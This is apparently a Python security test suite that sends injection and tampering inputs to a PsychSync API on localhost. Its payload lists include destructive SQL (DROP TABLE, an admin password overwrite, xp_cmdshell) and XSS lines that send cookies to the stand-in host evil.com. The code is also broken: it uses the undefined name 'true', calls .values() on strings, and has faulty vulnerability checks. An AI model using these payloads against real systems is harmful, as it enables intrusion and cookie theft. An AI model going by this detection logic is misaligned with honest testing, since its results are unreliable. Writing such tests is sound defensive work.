#!/usr/bin/env python3
"""
Comprehensive Input Validation Security Testing Suite for PsychSync
Tests for SQL injection, XSS, parameter pollution, HTML injection, and business logic bypass
"""

import asyncio
import aiohttp
import json
from typing import Dict, List, Any
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class InputValidationSecurityTester:
    """Comprehensive input validation security tester"""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.results = []
        self.session = None

    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all input validation security tests"""
        logger.info("🔍 Starting Comprehensive Input Validation Security Tests")

        async with aiohttp.ClientSession() as session:
            self.session = session

            # Test 1: SQL Injection
            await self.test_sql_injection()

            # Test 2: XSS with Event Handlers
            await self.test_xss_event_handlers()

            # Test 3: HTTP Parameter Pollution
            await self.test_http_parameter_pollution()

            # Test 4: HTML Injection
            await self.test_html_injection()

            # Test 5: Business Logic Bypass
            await self.test_business_logic_bypass()

        return self.generate_report()

    async def test_sql_injection(self):
        """Test all input fields for SQL injection vulnerabilities"""
        logger.info("🧪 Testing SQL Injection Vulnerabilities")

        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users --",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "' OR 'a'='a",
            "1' OR '1'='1' FROM users--",
            "'; INSERT INTO users VALUES('hacker','pass')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "1'; EXEC xp_cmdshell('dir'); --",
            "1' AND (SELECT COUNT(*) FROM users) > 0--"
        ]

        # Test endpoints that accept user input
        test_endpoints = [
            {"path": "/api/v1/auth/login", "method": "POST", "params": ["email", "password"]},
            {"path": "/api/v1/auth/register", "method": "POST", "params": ["email", "password", "full_name"]},
            {"path": "/api/v1/users/profile", "method": "PUT", "params": ["full_name", "bio"]},
            {"path": "/api/v1/assessments", "method": "POST", "params": ["title", "description"]},
            {"path": "/api/v1/teams", "method": "POST", "params": ["name", "description"]}
        ]

        for endpoint in test_endpoints:
            for payload in sql_payloads:
                await self._test_sql_injection_endpoint(endpoint, payload)

    async def _test_sql_injection_endpoint(self, endpoint: Dict[str, Any], payload: str):
        """Test SQL injection on a specific endpoint"""
        try:
            # Prepare test data with SQL injection payload
            test_data = {}
            for param in endpoint["params"]:
                test_data[param] = payload

            # Make request
            url = f"{self.base_url}{endpoint['path']}"

            if endpoint["method"] == "POST":
                async with self.session.post(url, json=test_data) as response:
                    status = response.status
                    response_text = await response.text()
            else:
                async with self.session.get(url, params=test_data) as response:
                    status = response.status
                    response_text = await response.text()

            # Check for SQL injection indicators
            sql_indicators = [
                "mysql_fetch", "sql syntax", "ora-", "sql error",
                "warning: mysql", "postgresql", "sqlite", "database error",
                "syntax error", "unexpected token", "column", "table",
                "you have an error in your sql syntax"
            ]

            is_vulnerable = (
                status == 500 or  # Internal server error
                any(indicator.lower() in response_text.lower() for indicator in sql_indicators) or
                "success" in response_text.lower() and payload in test_data.values()  # Unexpected success
            )

            self.results.append({
                "test_type": "SQL_INJECTION",
                "endpoint": endpoint["path"],
                "method": endpoint["method"],
                "payload": payload,
                "status_code": status,
                "vulnerable": is_vulnerable,
                "evidence": response_text[:200] if is_vulnerable else None,
                "timestamp": datetime.utcnow().isoformat()
            })

            if is_vulnerable:
                logger.warning(f"🚨 SQL INJECTION DETECTED: {endpoint['path']} - Payload: {payload}")
            else:
                logger.info(f"✅ SQL Injection Test Passed: {endpoint['path']}")

        except Exception as e:
            logger.error(f"❌ SQL Injection Test Error: {endpoint['path']} - {str(e)}")

    async def test_xss_event_handlers(self):
        """Test XSS with event handlers"""
        logger.info("🧪 Testing XSS with Event Handlers")

        # XSS payloads with event handlers
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "javascript:alert('XSS')",
            "<script>document.location='http://evil.com'+document.cookie</script>",
            "<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>",
            "<svg><script>alert('XSS')</script></svg>",
            "';alert('XSS');//",
            "<script>new Image().src='http://evil.com/'+document.cookie;</script>"
        ]

        # Test endpoints that accept and might reflect user input
        test_endpoints = [
            {"path": "/api/v1/auth/login", "method": "POST", "params": ["email"]},
            {"path": "/api/v1/users/profile", "method": "PUT", "params": ["full_name", "bio"]},
            {"path": "/api/v1/assessments", "method": "POST", "params": ["title", "description"]},
            {"path": "/api/v1/teams", "method": "POST", "params": ["name", "description"]}
        ]

        for endpoint in test_endpoints:
            for payload in xss_payloads:
                await self._test_xss_endpoint(endpoint, payload)

    async def _test_xss_endpoint(self, endpoint: Dict[str, Any], payload: str):
        """Test XSS on a specific endpoint"""
        try:
            # Prepare test data
            test_data = {}
            for param in endpoint["params"]:
                test_data[param] = payload

            url = f"{self.base_url}{endpoint['path']}"

            # Make request
            if endpoint["method"] == "POST":
                async with self.session.post(url, json=test_data) as response:
                    status = response.status
                    response_text = await response.text()
                    response_headers = dict(response.headers)
            else:
                async with self.session.get(url, params=test_data) as response:
                    status = response.status
                    response_text = await response.text()
                    response_headers = dict(response.headers)

            # Check for XSS indicators
            xss_indicators = [
                payload in response_text,  # Payload reflected
                "<script>" in response_text.lower(),
                "javascript:" in response_text.lower(),
                "onerror=" in response_text.lower(),
                "onload=" in response_text.lower(),
                "onfocus=" in response_text.lower(),
                "alert(" in response_text.lower()
            ]

            # Check Content-Security-Policy header
            csp_header = response_headers.get("Content-Security-Policy", "")
            has_csp = len(csp_header) > 0

            is_vulnerable = any(xss_indicators) and not has_csp

            self.results.append({
                "test_type": "XSS_EVENT_HANDLERS",
                "endpoint": endpoint["path"],
                "method": endpoint["method"],
                "payload": payload,
                "status_code": status,
                "vulnerable": is_vulnerable,
                "has_csp": has_csp,
                "evidence": response_text[:200] if is_vulnerable else None,
                "timestamp": datetime.utcnow().isoformat()
            })

            if is_vulnerable:
                logger.warning(f"🚨 XSS DETECTED: {endpoint['path']} - Payload: {payload}")
            else:
                logger.info(f"✅ XSS Test Passed: {endpoint['path']}")

        except Exception as e:
            logger.error(f"❌ XSS Test Error: {endpoint['path']} - {str(e)}")

    async def test_http_parameter_pollution(self):
        """Test HTTP parameter pollution"""
        logger.info("🧪 Testing HTTP Parameter Pollution")

        # Test cases for parameter pollution
        pollution_tests = [
            # Duplicate parameter with different values
            {"param": "email", "values": ["test@example.com", "admin@example.com"]},
            {"param": "user_id", "values": ["1", "2"]},
            {"param": "role", "values": ["user", "admin"]},
            {"param": "id", "values": ["1", "999"]},

            # Array-like parameters
            {"param": "email[]", "values": ["test@example.com", "admin@example.com"]},
            {"param": "roles[]", "values": ["user", "admin"]},

            # Encoded variations
            {"param": "email", "values": ["test@example.com", "test%40example.com"]},
        ]

        test_endpoints = [
            {"path": "/api/v1/auth/login", "method": "POST"},
            {"path": "/api/v1/users/me", "method": "GET"},
            {"path": "/api/v1/assessments", "method": "GET"},
            {"path": "/api/v1/teams", "method": "GET"}
        ]

        for endpoint in test_endpoints:
            for pollution_test in pollution_tests:
                await self._test_parameter_pollution(endpoint, pollution_test)

    async def _test_parameter_pollution(self, endpoint: Dict[str, Any], pollution_test: Dict[str, Any]):
        """Test parameter pollution on an endpoint"""
        try:
            url = f"{self.base_url}{endpoint['path']}"

            # Create parameter pollution request
            params = {}
            for i, value in enumerate(pollution_test["values"]):
                if i == 0:
                    params[pollution_test["param"]] = value
                else:
                    # Add duplicate parameter
                    params[f"{pollution_test['param']}_{i}"] = value

            # Make request
            if endpoint["method"] == "POST":
                async with self.session.post(url, json=params) as response:
                    status = response.status
                    response_text = await response.text()
            else:
                async with self.session.get(url, params=params) as response:
                    status = response.status
                    response_text = await response.text()

            # Check for parameter pollution indicators
            pollution_indicators = [
                "error" in response_text.lower(),
                "invalid" in response_text.lower(),
                "conflict" in response_text.lower(),
                status == 400,  # Bad Request
                status == 409,  # Conflict
                len(str(response_text)) > 10000  # Unexpectedly large response
            ]

            is_vulnerable = status == 200 and any(indicator not in response_text.lower() for indicator in ["error", "invalid"])

            self.results.append({
                "test_type": "HTTP_PARAMETER_POLLUTION",
                "endpoint": endpoint["path"],
                "method": endpoint["method"],
                "param": pollution_test["param"],
                "values": pollution_test["values"],
                "status_code": status,
                "vulnerable": is_vulnerable,
                "evidence": response_text[:200] if is_vulnerable else None,
                "timestamp": datetime.utcnow().isoformat()
            })

            if is_vulnerable:
                logger.warning(f"🚨 PARAMETER POLLUTION DETECTED: {endpoint['path']} - Param: {pollution_test['param']}")
            else:
                logger.info(f"✅ Parameter Pollution Test Passed: {endpoint['path']}")

        except Exception as e:
            logger.error(f"❌ Parameter Pollution Test Error: {endpoint['path']} - {str(e)}")

    async def test_html_injection(self):
        """Test for HTML injection vulnerabilities"""
        logger.info("🧪 Testing HTML Injection Vulnerabilities")

        # HTML injection payloads
        html_payloads = [
            "<html><body><h1>HTML Injection</h1></body></html>",
            "<div style='color:red'>RED TEXT</div>",
            "<iframe src='http://evil.com'></iframe>",
            "<link rel='stylesheet' href='http://evil.com/style.css'>",
            "<meta http-equiv='refresh' content='0;url=http://evil.com'>",
            "<form action='http://evil.com/steal'><input type='text' name='data'><input type='submit'></form>",
            "<script src='http://evil.com/script.js'></script>",
            "<style>body { background: url('http://evil.com/track.gif'); }</style>",
            "<object data='http://evil.com/evil.swf'></object>",
            "<embed src='http://evil.com/evil.swf'>",
            "<applet code='evil.class' archive='evil.jar'></applet>",
            "<base href='http://evil.com/'>",
            "<plaintext>TEXT</plaintext>",
            "<listing>CODE</listing>",
            "<xmp>EXAMPLE</xmp>"
        ]

        test_endpoints = [
            {"path": "/api/v1/users/profile", "method": "PUT", "params": ["full_name", "bio"]},
            {"path": "/api/v1/assessments", "method": "POST", "params": ["title", "description"]},
            {"path": "/api/v1/teams", "method": "POST", "params": ["name", "description"]},
            {"path": "/api/v1/responses", "method": "POST", "params": ["notes", "feedback"]}
        ]

        for endpoint in test_endpoints:
            for payload in html_payloads:
                await self._test_html_injection_endpoint(endpoint, payload)

    async def _test_html_injection_endpoint(self, endpoint: Dict[str, Any], payload: str):
        """Test HTML injection on a specific endpoint"""
        try:
            test_data = {}
            for param in endpoint["params"]:
                test_data[param] = payload

            url = f"{self.base_url}{endpoint['path']}"

            if endpoint["method"] == "POST":
                async with self.session.post(url, json=test_data) as response:
                    status = response.status
                    response_text = await response.text()
            else:
                async with self.session.get(url, params=test_data) as response:
                    status = response.status
                    response_text = await response.text()

            # Check for HTML injection indicators
            html_indicators = [
                payload in response_text,  # Payload reflected
                "<html" in response_text.lower(),
                "<body" in response_text.lower(),
                "<div" in response_text.lower(),
                "<iframe" in response_text.lower(),
                "<script" in response_text.lower(),
                "<style" in response_text.lower(),
                "<meta" in response_text.lower(),
                "<form" in response_text.lower(),
                "<link" in response_text.lower()
            ]

            is_vulnerable = (
                status == 200 and
                any(indicator in response_text.lower() for indicator in html_indicators) and
                "error" not in response_text.lower()
            )

            self.results.append({
                "test_type": "HTML_INJECTION",
                "endpoint": endpoint["path"],
                "method": endpoint["method"],
                "payload": payload,
                "status_code": status,
                "vulnerable": is_vulnerable,
                "evidence": response_text[:300] if is_vulnerable else None,
                "timestamp": datetime.utcnow().isoformat()
            })

            if is_vulnerable:
                logger.warning(f"🚨 HTML INJECTION DETECTED: {endpoint['path']} - Payload: {payload[:50]}...")
            else:
                logger.info(f"✅ HTML Injection Test Passed: {endpoint['path']}")

        except Exception as e:
            logger.error(f"❌ HTML Injection Test Error: {endpoint['path']} - {str(e)}")

    async def test_business_logic_bypass(self):
        """Test for business logic bypass via input tampering"""
        logger.info("🧪 Testing Business Logic Bypass Vulnerabilities")

        # Business logic bypass test cases
        bypass_tests = [
            # Price/amount manipulation
            {"endpoint": "/api/v1/assessments", "method": "POST", "data": {"price": -100, "title": "test"}},
            {"endpoint": "/api/v1/assessments", "method": "POST", "data": {"price": 0, "title": "test"}},
            {"endpoint": "/api/v1/assessments", "method": "POST", "data": {"price": 0.01, "title": "test"}},

            # Role manipulation
            {"endpoint": "/api/v1/auth/register", "method": "POST", "data": {"email": "test@test.com", "password": "test123", "role": "admin"}},
            {"endpoint": "/api/v1/auth/register", "method": "POST", "data": {"email": "test@test.com", "password": "test123", "is_admin": true}},

            # ID manipulation
            {"endpoint": "/api/v1/users/99999", "method": "GET"},  # Non-existent user ID
            {"endpoint": "/api/v1/users/0", "method": "GET"},      # Invalid user ID
            {"endpoint": "/api/v1/users/-1", "method": "GET"},     # Negative user ID

            # Limit bypass
            {"endpoint": "/api/v1/assessments", "method": "GET", "params": {"limit": 999999}},
            {"endpoint": "/api/v1/assessments", "method": "GET", "params": {"limit": -1}},
            {"endpoint": "/api/v1/assessments", "method": "GET", "params": {"limit": "999999 OR 1=1"}},

            # Status manipulation
            {"endpoint": "/api/v1/assessments", "method": "POST", "data": {"title": "test", "status": "approved"}},
            {"endpoint": "/api/v1/assessments", "method": "POST", "data": {"title": "test", "published": true}},

            # Date manipulation
            {"endpoint": "/api/v1/assessments", "method": "POST", "data": {"title": "test", "created_at": "2099-12-31"}},
            {"endpoint": "/api/v1/assessments", "method": "POST", "data": {"title": "test", "expires_at": "1970-01-01"}},
        ]

        for test_case in bypass_tests:
            await self._test_business_logic_bypass(test_case)

    async def _test_business_logic_bypass(self, test_case: Dict[str, Any]):
        """Test business logic bypass on a specific case"""
        try:
            url = f"{self.base_url}{test_case['endpoint']}"
            method = test_case["method"]
            data = test_case.get("data", {})
            params = test_case.get("params", {})

            # Make request
            if method == "POST":
                async with self.session.post(url, json=data) as response:
                    status = response.status
                    response_text = await response.text()
            else:
                async with self.session.get(url, params=params) as response:
                    status = response.status
                    response_text = await response.text()

            # Check for business logic bypass indicators
            bypass_indicators = [
                status == 200,  # Unexpected success
                status == 201,  # Created successfully
                "admin" in response_text.lower(),
                "unauthorized" not in response_text.lower(),
                "forbidden" not in response_text.lower(),
                "error" not in response_text.lower(),
                "invalid" not in response_text.lower(),
                "approved" in response_text.lower(),
                "success" in response_text.lower()
            ]

            # Check if this should have failed but didn't
            should_fail = (
                "admin" in str(data) or  # Trying to set admin role
                -1 in str(data).values() or -1 in params.values() or  # Negative values
                99999 in str(url) or  # Very large ID
                0 in str(data).values() or 0 in params.values()  # Zero values
            )

            is_vulnerable = should_fail and status not in [400, 401, 403, 404, 422]

            self.results.append({
                "test_type": "BUSINESS_LOGIC_BYPASS",
                "endpoint": test_case["endpoint"],
                "method": method,
                "data": data,
                "params": params,
                "status_code": status,
                "vulnerable": is_vulnerable,
                "should_fail": should_fail,
                "evidence": response_text[:200] if is_vulnerable else None,
                "timestamp": datetime.utcnow().isoformat()
            })

            if is_vulnerable:
                logger.warning(f"🚨 BUSINESS LOGIC BYPASS DETECTED: {test_case['endpoint']} - Data: {data}")
            else:
                logger.info(f"✅ Business Logic Test Passed: {test_case['endpoint']}")

        except Exception as e:
            logger.error(f"❌ Business Logic Test Error: {test_case['endpoint']} - {str(e)}")

    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive security test report"""
        vulnerabilities = [r for r in self.results if r.get("vulnerable", False)]

        report = {
            "test_summary": {
                "total_tests": len(self.results),
                "vulnerabilities_found": len(vulnerabilities),
                "test_date": datetime.utcnow().isoformat(),
                "base_url": self.base_url
            },
            "vulnerabilities_by_type": {
                "SQL_INJECTION": [r for r in vulnerabilities if r["test_type"] == "SQL_INJECTION"],
                "XSS_EVENT_HANDLERS": [r for r in vulnerabilities if r["test_type"] == "XSS_EVENT_HANDLERS"],
                "HTTP_PARAMETER_POLLUTION": [r for r in vulnerabilities if r["test_type"] == "HTTP_PARAMETER_POLLUTION"],
                "HTML_INJECTION": [r for r in vulnerabilities if r["test_type"] == "HTML_INJECTION"],
                "BUSINESS_LOGIC_BYPASS": [r for r in vulnerabilities if r["test_type"] == "BUSINESS_LOGIC_BYPASS"]
            },
            "detailed_results": self.results,
            "recommendations": self._generate_recommendations(vulnerabilities)
        }

        return report

    def _generate_recommendations(self, vulnerabilities: List[Dict[str, Any]]) -> List[str]:
        """Generate security recommendations based on found vulnerabilities"""
        recommendations = []

        vuln_types = set(v["test_type"] for v in vulnerabilities)

        if "SQL_INJECTION" in vuln_types:
            recommendations.extend([
                "Implement parameterized queries/prepared statements",
                "Use ORM functions instead of raw SQL",
                "Validate and sanitize all database inputs",
                "Implement database access controls"
            ])

        if "XSS_EVENT_HANDLERS" in vuln_types:
            recommendations.extend([
                "Implement Content Security Policy (CSP) headers",
                "Sanitize and escape all user-provided content",
                "Use template auto-escaping",
                "Validate input formats and lengths"
            ])

        if "HTTP_PARAMETER_POLLUTION" in vuln_types:
            recommendations.extend([
                "Validate parameter names and values",
                "Use strict parameter parsing",
                "Implement parameter type checking",
                "Avoid accepting duplicate parameter names"
            ])

        if "HTML_INJECTION" in vuln_types:
            recommendations.extend([
                "HTML-encode all user-generated content",
                "Use whitelist-based HTML sanitization",
                "Implement proper content type headers",
                "Disable HTML in text-only fields"
            ])

        if "BUSINESS_LOGIC_BYPASS" in vuln_types:
            recommendations.extend([
                "Implement server-side validation for all business rules",
                "Validate all user inputs regardless of source",
                "Implement role-based access controls",
                "Add audit logging for sensitive operations"
            ])

        return recommendations


async def main():
    """Run the comprehensive input validation security tests"""
    tester = InputValidationSecurityTester()

    logger.info("🚀 Starting Comprehensive Input Validation Security Tests")

    try:
        report = await tester.run_all_tests()

        # Print summary
        print("\n" + "="*80)
        print("🔍 INPUT VALIDATION SECURITY TEST REPORT")
        print("="*80)

        summary = report["test_summary"]
        print(f"Total Tests: {summary['total_tests']}")
        print(f"Vulnerabilities Found: {summary['vulnerabilities_found']}")

        if summary['vulnerabilities_found'] > 0:
            print("\n🚨 VULNERABILITIES DETECTED:")

            for vuln_type, vulns in report["vulnerabilities_by_type"].items():
                if vulns:
                    print(f"\n  {vuln_type}: {len(vulns)} vulnerabilities")
                    for vuln in vulns[:3]:  # Show first 3 examples
                        print(f"    - {vuln['endpoint']}: {vuln.get('payload', 'N/A')}")

            print("\n📋 RECOMMENDATIONS:")
            for rec in report["recommendations"]:
                print(f"  • {rec}")
        else:
            print("\n✅ NO VULNERABILITIES DETECTED")
            print("All input validation tests passed successfully!")

        # Save detailed report
        with open("input_validation_security_report.json", "w") as f:
            json.dump(report, f, indent=2)

        print(f"\n📄 Detailed report saved to: input_validation_security_report.json")

    except Exception as e:
        logger.error(f"❌ Test execution failed: {str(e)}")
        raise


if __name__ == "__main__":
    asyncio.run(main())
